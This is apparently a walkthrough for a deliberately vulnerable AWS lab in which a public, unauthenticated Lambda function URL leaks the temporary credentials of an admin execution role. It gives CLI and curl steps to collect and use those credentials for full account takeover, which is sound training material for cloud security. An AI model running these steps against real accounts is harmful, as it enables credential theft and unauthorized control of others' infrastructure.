# Guided Walkthrough: Public Lambda with Admin Role (Toxic Combination)

A Lambda function URL with `AuthorizationType: NONE` is publicly accessible from anywhere on the internet — no AWS credentials or signature required. When that same function's execution role carries `AdministratorAccess`, the combination creates a direct, unauthenticated path to full account compromise. An attacker only needs to discover the function URL and send an HTTP request to gain access to short-lived credentials scoped to the admin role.

The toxic combination here is not any single misconfiguration but the co-existence of two: public exposure and over-privileged permissions. Either finding alone would be serious; together they eliminate any barrier between an unauthenticated external attacker and complete control of the AWS account. Lambda function URLs are easy to overlook because they appear in a separate section of the Lambda console from the function's IAM settings.

In real environments this pattern shows up when developers prototype features using permissive roles and then deploy to production without tightening permissions, or when an existing Lambda function's URL is enabled without reviewing the attached role.

## The Challenge

You are an unauthenticated attacker on the public internet. You have no AWS credentials. Somehow you've learned that there is a Lambda function URL in a target AWS account — perhaps through passive recon of the organization's infrastructure, leaked source code, or a stray comment in a public repository.

Your goal is to reach the `pl-public-lambda-admin-role` IAM role, which has `AdministratorAccess` attached. Getting there requires nothing more than an HTTP client.

## Reconnaissance

Before launching the attack, it's worth understanding what you're dealing with. If you happen to have a low-privilege AWS principal in the account, you could enumerate Lambda function URLs to find public ones:

```bash
aws lambda list-functions --query 'Functions[*].[FunctionName,FunctionArn]' --output table

# For any function you find, check if it has a public URL
aws lambda get-function-url-config --function-name pl-public-admin-lambda
```

The `get-function-url-config` response will show `"AuthorizationType": "NONE"` — the critical indicator that no credentials are required to invoke it.

You can also check the execution role's permissions to understand the blast radius before you even invoke the function:

```bash
aws iam list-attached-role-policies --role-name pl-public-lambda-admin-role
```

If you see `AdministratorAccess` in the output, you already know what's waiting on the other side.

## Exploitation

### Step 1: Obtain the function URL

The Lambda function URL is available in the Terraform outputs for this scenario:

```bash
# From the project root
terraform output -json | jq -r '.single_account_cspm_toxic_combo_public_lambda_with_admin.value'
```

The function URL looks like: `https://<id>.lambda-url.<region>.on.aws/`

### Step 2: Invoke the function unauthenticated

Send a plain HTTP request — no AWS credentials, no Signature Version 4, nothing:

```bash
curl -s https://<function-url-id>.lambda-url.<region>.on.aws/
```

The function returns its environment variables in the response body, including the execution role's temporary credentials injected by the Lambda runtime:

```json
{
  "AWS_ACCESS_KEY_ID": "ASIA...",
  "AWS_SECRET_ACCESS_KEY": "...",
  "AWS_SESSION_TOKEN": "..."
}
```

### Step 3: Use the extracted credentials

Take the three credential values from the response and configure your AWS CLI environment:

```bash
export AWS_ACCESS_KEY_ID="<value from response>"
export AWS_SECRET_ACCESS_KEY="<value from response>"
export AWS_SESSION_TOKEN="<value from response>"
```

## Verification

Confirm that the extracted credentials give you the admin role's identity:

```bash
aws sts get-caller-identity
```

You should see output like:

```json
{
    "UserId": "AROA...:pl-public-admin-lambda",
    "Account": "<account_id>",
    "Arn": "arn:aws:sts::<account_id>:assumed-role/pl-public-lambda-admin-role/pl-public-admin-lambda"
}
```

You are now operating as `pl-public-lambda-admin-role` with `AdministratorAccess`. You can perform any action in the AWS account — read secrets from Secrets Manager, create IAM users, exfiltrate data from S3, or establish persistence.

## What Happened

An unauthenticated HTTP request was all it took to compromise the AWS account. The `pl-public-admin-lambda` function had a URL configured with `AuthorizationType: NONE`, making it publicly invocable by anyone. When invoked, the Lambda runtime injected the execution role's temporary credentials — belonging to `pl-public-lambda-admin-role` with `AdministratorAccess` — into the function's environment variables. The function returned those credentials in its response, handing full administrative control to the attacker.

Neither misconfiguration alone is the complete story. A public Lambda URL on a function with a read-only role would be a limited exposure. A highly privileged Lambda function without a public URL requires valid AWS credentials to exploit. The toxic combination is what makes this critical: the two misconfigurations multiply each other's risk, collapsing the authentication barrier entirely and granting any internet user full account access.
